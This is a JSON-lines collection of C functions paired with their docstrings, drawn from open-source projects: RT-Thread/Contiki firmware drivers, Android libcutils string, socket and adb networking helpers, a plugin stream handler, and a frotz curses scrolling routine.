"repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*\n * can register\n */\n", "func_signal": "rt_err_t rt_hw_can_register(struct rt_can_device *can,\n                            const char              *name,\n                            const struct rt_can_ops *ops,\n                            void                    *data)", "code": "{\n    struct rt_device *device;\n    RT_ASSERT(can != RT_NULL);\n\n    device = &(can->parent);\n\n    device->type        = RT_Device_Class_CAN;\n    device->rx_indicate = RT_NULL;\n    device->tx_complete = RT_NULL;\n#ifdef RT_CAN_USING_HDR\n    can->hdr            = RT_NULL;\n#endif\n    can->can_rx         = RT_NULL;\n    can->can_tx         = RT_NULL;\n    rt_mutex_init(&(can->lock), \"can\", RT_IPC_FLAG_PRIO);\n#ifdef RT_CAN_USING_BUS_HOOK\n    can->bus_hook       = RT_NULL;\n#endif /*RT_CAN_USING_BUS_HOOK*/\n    device->init        = rt_can_init;\n    device->open        = rt_can_open;\n    device->close       = rt_can_close;\n    device->read        = rt_can_read;\n    device->write       = rt_can_write;\n    device->control     = rt_can_control;\n    can->ops            = ops;\n\n    can->status_indicate.ind  = RT_NULL;\n    can->status_indicate.args = RT_NULL;\n    rt_memset(&can->status, 0, sizeof(can->status));\n\n    device->user_data   = data;\n\n    can->timerinitflag  = 0;\n    rt_timer_init(&can->timer,\n                  name,\n                  cantimeout,\n                  (void *)can,\n                  can->config.ticks,\n                  RT_TIMER_FLAG_PERIODIC);\n    /* register a character device */\n    return rt_device_register(device, name, RT_DEVICE_FLAG_RDWR);\n}", "path": "firmware\\app\\rt-thread\\components\\drivers\\can\\can.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/**\n * This function will calculate the tick from millisecond.\n *\n * @param ms the specified millisecond\n *           - Negative Number wait forever\n *           - Zero not wait\n *           - Max 0x7fffffff\n *\n * @return the calculated tick\n */\n", "func_signal": "int rt_tick_from_millisecond(rt_int32_t ms)", "code": "{\n    int tick;\n\n    if (ms < 0)\n        tick = RT_WAITING_FOREVER;\n    else\n        tick = (RT_TICK_PER_SECOND * ms + 999) / 1000;\n\n    /* return the calculated tick */\n    return tick;\n}", "path": "firmware\\app\\rt-thread\\src\\clock.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*\n * Additionally, a handler function named [resource name]_handler must be implemented for each PERIODIC_RESOURCE.\n * It will be called by the REST manager process with the defined period.\n */\n", "func_signal": "static void\nres_periodic_handler()", "code": "{\n  /* Do a periodic task here, e.g., sampling a sensor. */\n  ++event_counter;\n\n  /* Usually a condition is defined under with subscribers are notified, e.g., large enough delta in sensor reading. */\n  if(1) {\n    /* Notify the registered observers which will trigger the res_get_handler to create the response. */\n    REST.notify_subscribers(&res_push);\n  }\n}", "path": "firmware\\app\\components\\contiki\\examples\\er-rest-example\\resources\\res-push.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/* Compare memory block */\n", "func_signal": "static\nint mem_cmp (const void* dst, const void* src, UINT cnt)", "code": "{\t/* ZR:same, NZ:different */\n\tconst BYTE *d = (const BYTE *)dst, *s = (const BYTE *)src;\n\tint r = 0;\n\n\tdo {\n\t\tr = *d++ - *s++;\n\t} while (--cnt && r == 0);\n\n\treturn r;\n}", "path": "firmware\\app\\rt-thread\\components\\dfs\\filesystems\\elmfat\\ff.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static int\noutput(void)", "code": "{\n  int len;\n\n  PRINTF(\"ip64-slip-interface: output source \");\n\n  /*\n  PRINT6ADDR(&UIP_IP_BUF->srcipaddr);\n  PRINTF(\" destination \");\n  PRINT6ADDR(&UIP_IP_BUF->destipaddr);\n  PRINTF(\"\\n\");\n  */\n  if(uip_ipaddr_cmp(&last_sender, &UIP_IP_BUF->srcipaddr)) {\n    PRINTF(\"ip64-interface: output, not sending bounced message\\n\");\n  } else {\n    len = ip64_6to4(&uip_buf[UIP_LLH_LEN], uip_len,\n\t\t    ip64_packet_buffer);\n    PRINTF(\"ip64-interface: output len %d\\n\", len);\n    if(len > 0) {\n      memcpy(&uip_buf[UIP_LLH_LEN], ip64_packet_buffer, len);\n      uip_len = len;\n      slip_send();\n      return len;\n    }\n  }\n  return 0;\n}", "path": "firmware\\app\\components\\contiki\\core\\net\\ip64\\ip64-slip-interface.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static int\nhdrsize(const struct packetbuf_attrlist *a)", "code": "{\n  int size, len;\n  \n  /* Compute the total size of the final header by summing the size of\n     all attributes that are used on this channel. */\n  \n  size = 0;\n  for(; a->type != PACKETBUF_ATTR_NONE; ++a) {\n    /*    PRINTF(\"chameleon header_size: header type %d len %d\\n\",\n\t   a->type, a->len);*/\n#if CHAMELEON_WITH_MAC_LINK_ADDRESSES\n    if(a->type == PACKETBUF_ADDR_SENDER ||\n       a->type == PACKETBUF_ADDR_RECEIVER) {\n      /* Let the mac layer handle the sender and receiver */\n      continue;\n    }\n#endif /* CHAMELEON_WITH_MAC_LINK_ADDRESSES */\n    len = (a->len & 0xf8) + ((a->len & 7) ? 8: 0);\n    size += len;\n  }\n  return size / 8;\n}", "path": "firmware\\app\\components\\contiki\\core\\net\\rime\\chameleon-raw.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/* Non interpolating sine... which takes an angle of 0 - 999 */\n", "func_signal": "static int16_t sinI(uint16_t angleMilli)", "code": "{\n  uint16_t pos;\n  pos = (uint16_t) ((SIN_TAB_LEN * (uint32_t) angleMilli) / 1000);\n  return SIN_TAB[pos % SIN_TAB_LEN];\n}", "path": "firmware\\app\\components\\contiki\\core\\lib\\ifft.c", "repo_name": "ART-6LoWPAN/art-6lowpan", "stars": 181, "license": "mit", "language": "c", "size": 31565}
{"docstring": "/**\n * Unfortunately, java.net.Socket wants to create it's filedescriptor early\n * So, this function takes an fd that must be an unconnected\n * PF_LOCAL SOCK_STREAM\n */\n", "func_signal": "int adb_networking_connect_fd(int fd, struct sockaddr_in *p_address)", "code": "{\n    struct sockaddr_in local_addr;\n    socklen_t alen;\n    char *cmd;\n    char buf[ADB_RESPONSE_SIZE + 1];\n    ssize_t count_read;\n    int ret;\n    int err;\n    /* for impl of inet_ntoa below*/\n    union {\n        uint8_t  b[4];\n        uint32_t l;\n    } a;\n\n    /* First, connect to adb */\n   \n    memset(&local_addr, 0, sizeof(local_addr));\n    local_addr.sin_family = AF_INET;\n    local_addr.sin_port = htons(ADB_PORT);\n    local_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n\n    do {\n        err = connect(fd, (struct sockaddr *) &local_addr, sizeof(local_addr));\n    } while (err < 0 && errno == EINTR);\n\n    if (err < 0) {\n        return -1;\n    }\n\n    a.l = p_address->sin_addr.s_addr;\n\n    // compose the command\n    asprintf(&cmd, \"tcp:%u:%u.%u.%u.%u\", \n                (unsigned int)ntohs(p_address->sin_port), \n                a.b[0],a.b[1],a.b[2],a.b[3]);\n\n    // buf is now the ascii hex length of cmd\n    snprintf(buf, sizeof(buf), \"%04X\", strlen(cmd));\n\n    // write the 4-byte length\n    do {\n        err = write(fd, buf, 4);        \n    } while (err < 0 && errno == EINTR);\n\n    // write the command\n    do {\n        err = write(fd, cmd, strlen(cmd));        \n    } while (err < 0 && errno == EINTR);\n\n    // read the result\n    do {\n        count_read = read(fd, buf, sizeof(buf) - 1);\n    } while (count_read < 0 && errno != EINTR);\n\n    if (count_read == ADB_RESPONSE_SIZE \n            && 0 == strncmp(buf, \"OKAY\", ADB_RESPONSE_SIZE)) {\n        ret = 0;\n    } else {\n        /* what errno here? <shrug? */\n        errno = ENETUNREACH;\n        ret = -1;\n    }\n\n    free(cmd);\n    \n    return ret;\n}", "path": "utils\\libcutils\\adb_networking.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * out_len is an out parameter (which may not be null) containing the\n * length of the UTF-16 string (which may contain embedded \\0's)\n */\n", "func_signal": "extern char16_t * strcpy8to16 (char16_t *utf16Str, const char*utf8Str, \n                                       size_t *out_len)", "code": "{   \n    char16_t *dest = utf16Str;\n\n    while (*utf8Str != '\\0') {\n        uint32_t ret;\n\n        ret = getUtf32FromUtf8(&utf8Str);\n\n        if (ret <= 0xffff) {\n            *dest++ = (char16_t) ret;\n        } else if (ret <= UNICODE_UPPER_LIMIT)  {\n            /* Create surrogate pairs */\n            /* See http://en.wikipedia.org/wiki/UTF-16/UCS-2#Method_for_code_points_in_Plane_1.2C_Plane_2 */\n\n            *dest++ = 0xd800 | ((ret - 0x10000) >> 10);\n            *dest++ = 0xdc00 | ((ret - 0x10000) &  0x3ff);\n        } else {\n            *dest++ = UTF16_REPLACEMENT_CHAR;\n        }\n    }\n\n    *out_len = dest - utf16Str;\n\n    return utf16Str;\n}", "path": "utils\\libcutils\\strdup8to16.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * length is the number of characters in the UTF-8 string.\n * out_len is an out parameter (which may not be null) containing the\n * length of the UTF-16 string (which may contain embedded \\0's)\n */\n", "func_signal": "extern char16_t * strcpylen8to16 (char16_t *utf16Str, const char*utf8Str,\n                                       int length, size_t *out_len)", "code": "{\n    /* TODO: Share more of this code with the method above. Only 2 lines changed. */\n    \n    char16_t *dest = utf16Str;\n\n    const char *end = utf8Str + length; /* This line */\n    while (utf8Str < end) {             /* and this line changed. */\n        uint32_t ret;\n\n        ret = getUtf32FromUtf8(&utf8Str);\n\n        if (ret <= 0xffff) {\n            *dest++ = (char16_t) ret;\n        } else if (ret <= UNICODE_UPPER_LIMIT)  {\n            /* Create surrogate pairs */\n            /* See http://en.wikipedia.org/wiki/UTF-16/UCS-2#Method_for_code_points_in_Plane_1.2C_Plane_2 */\n\n            *dest++ = 0xd800 | ((ret - 0x10000) >> 10);\n            *dest++ = 0xdc00 | ((ret - 0x10000) &  0x3ff);\n        } else {\n            *dest++ = UTF16_REPLACEMENT_CHAR;\n        }\n    }\n\n    *out_len = dest - utf16Str;\n\n    return utf16Str;\n}", "path": "utils\\libcutils\\strdup8to16.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * out_len is an out parameter (which may not be null) containing the\n * length of the UTF-16 string (which may contain embedded \\0's)\n */\n", "func_signal": "extern char16_t * strdup8to16 (const char* s, size_t *out_len)", "code": "{\n    char16_t *ret;\n    size_t len;\n\n    if (s == NULL) return NULL;\n\n    len = strlen8to16(s);\n\n    // fail on overflow\n    if (len && SIZE_MAX/len < sizeof(char16_t))\n        return NULL;\n\n    // no plus-one here. UTF-16 strings are not null terminated\n    ret = (char16_t *) malloc (sizeof(char16_t) * len);\n\n    return strcpy8to16 (ret, s, out_len);\n}", "path": "utils\\libcutils\\strdup8to16.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Removes stale file descriptors and initializes file descriptor sets.\n */\n", "func_signal": "static void prepareForSelect(Selector* selector)", "code": "{\n    fd_set* exceptFds = &selector->exceptFds;\n    fd_set* readFds = &selector->readFds;\n    fd_set* writeFds = &selector->writeFds;\n    \n    FD_ZERO(exceptFds);\n    FD_ZERO(readFds);\n    FD_ZERO(writeFds);\n\n    Array* selectableFds = selector->selectableFds;\n    int i = 0;\n    selector->maxFd = 0;\n    int size = arraySize(selectableFds);\n    while (i < size) {\n        SelectableFd* selectableFd = arrayGet(selectableFds, i);\n        if (selectableFd->remove) {\n            // This descriptor should be removed.\n            arrayRemove(selectableFds, i);\n            size--;\n            if (selectableFd->onRemove != NULL) {\n                selectableFd->onRemove(selectableFd);\n            }\n            free(selectableFd);\n        } else {\n            if (selectableFd->beforeSelect != NULL) {\n                selectableFd->beforeSelect(selectableFd);\n            }\n            \n            bool inSet = false;\n            if (maybeAdd(selectableFd, selectableFd->onExcept, exceptFds)) {\n            \tLOGD(\"Selecting fd %d for writing...\", selectableFd->fd);\n                inSet = true;\n            }\n            if (maybeAdd(selectableFd, selectableFd->onReadable, readFds)) {\n            \tLOGD(\"Selecting fd %d for reading...\", selectableFd->fd);\n                inSet = true;\n            }\n            if (maybeAdd(selectableFd, selectableFd->onWritable, writeFds)) {\n                inSet = true;\n            }\n\n            if (inSet) {\n                // If the fd is in a set, check it against max.\n                int fd = selectableFd->fd;\n                if (fd > selector->maxFd) {\n                    selector->maxFd = fd;\n                }\n            }\n            \n            // Move to next descriptor.\n            i++;\n        }\n    }\n}", "path": "utils\\libcutils\\selector.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Hashes the given key.\n */\n", "func_signal": "static inline int hashKey(Hashmap* map, void* key)", "code": "{\n    int h = map->hash(key);\n\n    // We apply this secondary hashing discovered by Doug Lea to defend\n    // against bad hashes.\n    h += ~(h << 9);\n    h ^= (((unsigned int) h) >> 14);\n    h += (h << 4);\n    h ^= (((unsigned int) h) >> 10);\n       \n    return h;\n}", "path": "utils\\libcutils\\hashmap.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * connect to peer named \"name\" on fd\n * returns same fd or -1 on error.\n * fd is not closed on error. that's your job.\n * \n * Used by AndroidSocketImpl\n */\n", "func_signal": "int socket_local_client_connect(int fd, const char *name, int namespaceId, \n        int type)", "code": "{\n    struct sockaddr_un addr;\n    socklen_t alen;\n    size_t namelen;\n    int err;\n\n    err = socket_make_sockaddr_un(name, namespaceId, &addr, &alen);\n\n    if (err < 0) {\n        goto error;\n    }\n\n    if(connect(fd, (struct sockaddr *) &addr, alen) < 0) {\n        goto error;\n    }\n\n    return fd;\n\nerror:\n    return -1;\n}", "path": "utils\\libcutils\\socket_local_client.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/** Returns 0 if successful, < 0 otherwise.. */\n", "func_signal": "static int ensureCapacity(Array* array, int capacity)", "code": "{\n    int oldCapacity = array->capacity;\n    if (capacity > oldCapacity) {\n        int newCapacity = (oldCapacity == 0) ? INITIAL_CAPACITY : oldCapacity;\n\n        // Ensure we're not doing something nasty\n        if (capacity > MAX_CAPACITY)\n            return -1;\n\n        // Keep doubling capacity until we surpass necessary capacity.\n        while (newCapacity < capacity) {\n            int  newCap = newCapacity*2;\n            // Handle integer overflows\n            if (newCap < newCapacity || newCap > MAX_CAPACITY) {\n                newCap = MAX_CAPACITY;\n            }\n            newCapacity = newCap;\n        }\n\n        // Should not happen, but better be safe than sorry\n        if (newCapacity < 0 || newCapacity > MAX_CAPACITY)\n            return -1;\n\n        void** newContents;\n        if (array->contents == NULL) {\n            // Allocate new array.\n            newContents = malloc(newCapacity * sizeof(void*));\n            if (newContents == NULL) {\n                return -1;\n            }\n        } else {\n            // Expand existing array.\n            newContents = realloc(array->contents, sizeof(void*) * newCapacity);\n            if (newContents == NULL) {\n                return -1;\n            }\n        }\n\n        array->capacity = newCapacity;\n        array->contents = newContents;\n    }\n\n    return 0;\n}", "path": "utils\\libcutils\\array.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "// FIXME: We really need to make all this stuff async\n", "func_signal": "int connection_got_data(int rpcfd, NPStream *stream, void *data, size_t data_len)", "code": "{\n    int avail, remain, ret, *p;\n\n    notice(\"connection_got_data [%p]: %d bytes\", stream, data_len);\n\n    avail = pluginfuncs.writeready(&nppt, stream);\n    _assert(avail >= data_len);\n    notice(\"avail = %d\", avail);\n\n    remain = data_len;\n    p = (int *) &stream->ndata;\n    do {\n        ret = pluginfuncs.write(&nppt, stream, *p, data_len, data);\n        *p += ret;\n        remain -= ret;\n    } while (remain > 0);\n\n    notice(\"sent.\");\n    free(data);\n\n    return 0;\n}", "path": "food\\np.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Given a UTF-16 string, compute the length of the corresponding UTF-8\n * string in bytes.\n */\n", "func_signal": "extern size_t strnlen16to8(const char16_t* utf16Str, size_t len)", "code": "{\n    size_t utf8Len = 0;\n\n    /* A small note on integer overflow. The result can\n     * potentially be as big as 3*len, which will overflow\n     * for len > SIZE_MAX/3.\n     *\n     * Moreover, the result of a strnlen16to8 is typically used\n     * to allocate a destination buffer to strncpy16to8 which\n     * requires one more byte to terminate the UTF-8 copy, and\n     * this is generally done by careless users by incrementing\n     * the result without checking for integer overflows, e.g.:\n     *\n     *   dst = malloc(strnlen16to8(utf16,len)+1)\n     *\n     * Due to this, the following code will try to detect\n     * overflows, and never return more than (SIZE_MAX-1)\n     * when it detects one. A careless user will try to malloc\n     * SIZE_MAX bytes, which will return NULL which can at least\n     * be detected appropriately.\n     *\n     * As far as I know, this function is only used by strndup16(),\n     * but better be safe than sorry.\n     */\n\n    /* Fast path for the usual case where 3*len is < SIZE_MAX-1.\n     */\n    if (len < (SIZE_MAX-1)/3) {\n        while (len--) {\n            unsigned int uic = *utf16Str++;\n\n            if (uic > 0x07ff)\n                utf8Len += 3;\n            else if (uic > 0x7f || uic == 0)\n                utf8Len += 2;\n            else\n                utf8Len++;\n        }\n        return utf8Len;\n    }\n\n    /* The slower but paranoid version */\n    while (len--) {\n        unsigned int  uic     = *utf16Str++;\n        size_t        utf8Cur = utf8Len;\n\n        if (uic > 0x07ff)\n            utf8Len += 3;\n        else if (uic > 0x7f || uic == 0)\n            utf8Len += 2;\n        else\n            utf8Len++;\n\n        if (utf8Len < utf8Cur) /* overflow detected */\n            return SIZE_MAX-1;\n    }\n\n    /* don't return SIZE_MAX to avoid common user bug */\n    if (utf8Len == SIZE_MAX)\n        utf8Len = SIZE_MAX-1;\n\n    return utf8Len;\n}", "path": "utils\\libcutils\\strdup16to8.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Convert a Java-Style UTF-16 string + length to a JNI-Style UTF-8 string.\n *\n * This basically means: embedded \\0's in the UTF-16 string are encoded\n * as \"0xc0 0x80\"\n *\n * Make sure you allocate \"utf8Str\" with the result of strlen16to8() + 1,\n * not just \"len\".\n *\n * Please note, a terminated \\0 is always added, so your result will always\n * be \"strlen16to8() + 1\" bytes long.\n */\n", "func_signal": "extern char* strncpy16to8(char* utf8Str, const char16_t* utf16Str, size_t len)", "code": "{\n    char* utf8cur = utf8Str;\n\n    /* Note on overflows: We assume the user did check the result of\n     * strnlen16to8() properly or at a minimum checked the result of\n     * its malloc(SIZE_MAX) in case of overflow.\n     */\n    while (len--) {\n        unsigned int uic = *utf16Str++;\n\n        if (uic > 0x07ff) {\n            *utf8cur++ = (uic >> 12) | 0xe0;\n            *utf8cur++ = ((uic >> 6) & 0x3f) | 0x80;\n            *utf8cur++ = (uic & 0x3f) | 0x80;\n        } else if (uic > 0x7f || uic == 0) {\n            *utf8cur++ = (uic >> 6) | 0xc0;\n            *utf8cur++ = (uic & 0x3f) | 0x80;\n        } else {\n            *utf8cur++ = uic;\n\n            if (uic == 0) {\n                break;\n            }\n        }\n    }\n\n   *utf8cur = '\\0';\n\n   return utf8Str;\n}", "path": "utils\\libcutils\\strdup16to8.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Convert a UTF-16 string to UTF-8.\n *\n */\n", "func_signal": "char * strndup16to8 (const char16_t* s, size_t n)", "code": "{\n    char*   ret;\n    size_t  len;\n\n    if (s == NULL) {\n        return NULL;\n    }\n\n    len = strnlen16to8(s, n);\n\n    /* We are paranoid, and we check for SIZE_MAX-1\n     * too since it is an overflow value for our\n     * strnlen16to8 implementation.\n     */\n    if (len >= SIZE_MAX-1)\n        return NULL;\n\n    ret = malloc(len + 1);\n    if (ret == NULL)\n        return NULL;\n\n    strncpy16to8 (ret, s, n);\n\n    return ret;\n}", "path": "utils\\libcutils\\strdup16to8.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/*\n * Retrieve the next UTF-32 character from a UTF-8 string.\n *\n * Stops at inner \\0's\n *\n * Returns UTF16_REPLACEMENT_CHAR if an invalid sequence is encountered\n *\n * Advances \"*pUtf8Ptr\" to the start of the next character.\n */\n", "func_signal": "static inline uint32_t getUtf32FromUtf8(const char** pUtf8Ptr)", "code": "{\n    uint32_t ret;\n    int seq_len;\n    int i;\n\n    /* Mask for leader byte for lengths 1, 2, 3, and 4 respectively*/\n    static const char leaderMask[4] = {0xff, 0x1f, 0x0f, 0x07};\n\n    /* Bytes that start with bits \"10\" are not leading characters. */\n    if (((**pUtf8Ptr) & 0xc0) == 0x80) {\n        (*pUtf8Ptr)++;\n        return UTF16_REPLACEMENT_CHAR;\n    }\n\n    /* note we tolerate invalid leader 11111xxx here */    \n    seq_len = UTF8_SEQ_LENGTH(**pUtf8Ptr);\n\n    ret = (**pUtf8Ptr) & leaderMask [seq_len - 1];\n\n    if (**pUtf8Ptr == '\\0') return ret;\n\n    (*pUtf8Ptr)++;\n    for (i = 1; i < seq_len ; i++, (*pUtf8Ptr)++) {\n        if ((**pUtf8Ptr) == '\\0') return UTF16_REPLACEMENT_CHAR;\n        if (((**pUtf8Ptr) & 0xc0) != 0x80) return UTF16_REPLACEMENT_CHAR;\n\n        UTF8_SHIFT_AND_MASK(ret, **pUtf8Ptr);\n    }\n\n    return ret;\n}", "path": "utils\\libcutils\\strdup8to16.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Adds an fd to the given set if the callback is non-null. Returns true\n * if the fd was added.\n */\n", "func_signal": "static inline bool maybeAdd(SelectableFd* selectableFd,\n        void (*callback)(SelectableFd*), fd_set* fdSet)", "code": "{\n    if (callback != NULL) {\n        FD_SET(selectableFd->fd, fdSet);\n        return true;\n    }\n    return false;\n}", "path": "utils\\libcutils\\selector.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Like \"strlen\", but for strings encoded with Java's modified UTF-8.\n *\n * The value returned is the number of UTF-16 characters required\n * to represent this string.\n */\n", "func_signal": "extern size_t strlen8to16 (const char* utf8Str)", "code": "{\n    size_t len = 0;\n    int ic;\n    int expected = 0;\n\n    while ((ic = *utf8Str++) != '\\0') {\n        /* bytes that start 0? or 11 are lead bytes and count as characters.*/\n        /* bytes that start 10 are extention bytes and are not counted */\n         \n        if ((ic & 0xc0) == 0x80) {\n            /* count the 0x80 extention bytes. if we have more than\n             * expected, then start counting them because strcpy8to16\n             * will insert UTF16_REPLACEMENT_CHAR's\n             */\n            expected--;\n            if (expected < 0) {\n                len++;\n            }\n        } else {\n            len++;\n            expected = UTF8_SEQ_LENGTH(ic) - 1;\n\n            /* this will result in a surrogate pair */\n            if (expected == 3) {\n                len++;\n            }\n        }\n    }\n\n    return len;\n}", "path": "utils\\libcutils\\strdup8to16.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Invokes a callback if the callback is non-null and the fd is in the given\n * set.\n */\n", "func_signal": "static inline void maybeInvoke(SelectableFd* selectableFd,\n        void (*callback)(SelectableFd*), fd_set* fdSet)", "code": "{\n\tif (callback != NULL && !selectableFd->remove && \n            FD_ISSET(selectableFd->fd, fdSet)) {\n\t\tLOGD(\"Selected fd %d.\", selectableFd->fd);\n        callback(selectableFd);\n    }\n}", "path": "utils\\libcutils\\selector.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Fills in *p_out_addr and returns 0 on success\n * Memset's *p_out_addr and returns -1 on fail\n */\n", "func_signal": "int adb_networking_gethostbyname(const char *name, struct in_addr *p_out_addr)", "code": "{\n    int fd;\n    char *cmd = NULL;\n    char buf[ADB_RESPONSE_SIZE + 1];\n    int err;\n    ssize_t count_read;\n    \n    fd = socket_loopback_client(ADB_PORT, SOCK_STREAM);\n\n    if (fd < 0) {\n        return -1;\n    }\n\n    // compose the command\n    asprintf(&cmd, \"dns:%s\", name);\n\n    // buf is now the ascii hex length of cmd\n    snprintf(buf, sizeof(buf), \"%04X\", strlen(cmd));\n\n    // write the 4-byte length\n    do {\n        err = write(fd, buf, 4);        \n    } while (err < 0 && errno == EINTR);\n\n    // write the command\n    do {\n        err = write(fd, cmd, strlen(cmd));        \n    } while (err < 0 && errno == EINTR);\n\n    // read the result\n    do {\n        count_read = read(fd, buf, ADB_RESPONSE_SIZE);\n    } while (count_read < 0 && errno != EINTR);\n\n    if (count_read != ADB_RESPONSE_SIZE \n            || 0 != strncmp(buf, \"OKAY\", ADB_RESPONSE_SIZE)) {\n        goto error;\n    }\n\n    // read the actual IP address\n    do {\n        count_read = read(fd, &(p_out_addr->s_addr), sizeof(p_out_addr->s_addr));\n    } while (count_read < 0 && errno != EINTR);\n\n    if (count_read != 4) {\n        goto error;\n    }\n\n    free(cmd);\n    close(fd);\n    return 0;\nerror:\n    free(cmd);\n    close(fd);\n    memset(p_out_addr, 0, sizeof(struct in_addr));\n    return -1;\n}", "path": "utils\\libcutils\\adb_networking.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/**\n * Notifies user if file descriptors are readable or writable, or if\n * out-of-band data is present.\n */\n", "func_signal": "static void fireEvents(Selector* selector)", "code": "{\n    Array* selectableFds = selector->selectableFds;\n    int size = arraySize(selectableFds);\n    int i;\n    for (i = 0; i < size; i++) {\n        SelectableFd* selectableFd = arrayGet(selectableFds, i);\n        maybeInvoke(selectableFd, selectableFd->onExcept,\n                &selector->exceptFds);\n        maybeInvoke(selectableFd, selectableFd->onReadable,\n                &selector->readFds);\n        maybeInvoke(selectableFd, selectableFd->onWritable,\n                &selector->writeFds);\n    }\n}", "path": "utils\\libcutils\\selector.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/*\n * Copy src to string dst of size siz.  At most siz-1 characters\n * will be copied.  Always NUL terminates (unless siz == 0).\n * Returns strlen(src); if retval >= siz, truncation occurred.\n */\n", "func_signal": "size_t\nstrlcpy(char *dst, const char *src, size_t siz)", "code": "{\n\tchar *d = dst;\n\tconst char *s = src;\n\tsize_t n = siz;\n\n\t/* Copy as many bytes as will fit */\n\tif (n != 0) {\n\t\twhile (--n != 0) {\n\t\t\tif ((*d++ = *s++) == '\\0')\n\t\t\t\tbreak;\n\t\t}\n  }\n\n\t/* Not enough room in dst, add NUL and traverse rest of src */\n\tif (n == 0) {\n\t\tif (siz != 0)\n\t\t\t*d = '\\0';\t\t/* NUL-terminate dst */\n\t\twhile (*s++)\n\t\t\t;\n\t}\n\n\treturn(s - src - 1);\t/* count does not include NUL */\n}", "path": "utils\\libcutils\\memory.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/** \n * connect to peer named \"name\"\n * returns fd or -1 on error\n */\n", "func_signal": "int socket_local_client(const char *name, int namespaceId, int type)", "code": "{\n    int s;\n\n    s = socket(AF_LOCAL, type, 0);\n    if(s < 0) return -1;\n\n    if ( 0 > socket_local_client_connect(s, name, namespaceId, type)) {\n        close(s);\n        return -1;\n    }\n\n    return s;\n}", "path": "utils\\libcutils\\socket_local_client.c", "repo_name": "comex/frash", "stars": 226, "license": "None", "language": "c", "size": 9500}
{"docstring": "/*\n * os_scroll_area\n *\n * Scroll a rectangular area of the screen up (units > 0) or down\n * (units < 0) and fill the empty space with the current background\n * colour. Top left coordinates are (1,1). The cursor stays put.\n *\n */\n", "func_signal": "void os_scroll_area (int top, int left, int bottom, int right, int units)", "code": "{\n  top--; left--; bottom--; right--;\n\n  if ((left == 0) && (right == h_screen_cols - 1)) {\n    static int old_scroll_top = 0;\n    static int old_scroll_bottom = 0;\n\n    if (!((old_scroll_top == top) && (old_scroll_bottom == bottom))) {\n        old_scroll_top = top; old_scroll_bottom = bottom;\n        setscrreg(top, bottom);\n    }\n    scrollok(stdscr, TRUE);\n    scrl(units);\n    scrollok(stdscr, FALSE);\n  } else {\n    int row, col, x, y;\n    chtype ch;\n\n    getyx(stdscr, y, x);\n    /* Must turn off attributes during copying.  */\n    attrset(0);\n    if (units > 0) {\n      for (row = top; row <= bottom - units; row++)\n\tfor (col = left; col <= right; col++) {\n\t  ch = mvinch(row + units, col);\n\t  mvaddch(row, col, ch);\n\t}\n    } else if (units < 0) {\n      for (row = bottom; row >= top - units; row--)\n\tfor (col = left; col <= right; col++) {\n\t  ch = mvinch(row + units, col);\n\t  mvaddch(row, col, ch);\n\t}\n    }\n    /* Restore attributes.  */\n    os_set_text_style(u_setup.current_text_style);\n    move(y, x);\n  }\n  if (units > 0)\n    os_erase_area(bottom - units + 2, left + 1, bottom + 1, right + 1, 0);\n  else if (units < 0)\n    os_erase_area(top + 1, left + 1, top - units, right + 1, 0);\n}", "path": "src\\curses\\ux_screen.c", "repo_name": "DavidGriffith/frotz", "stars": 207, "license": "gpl-2.0", "language": "c", "size": 987}
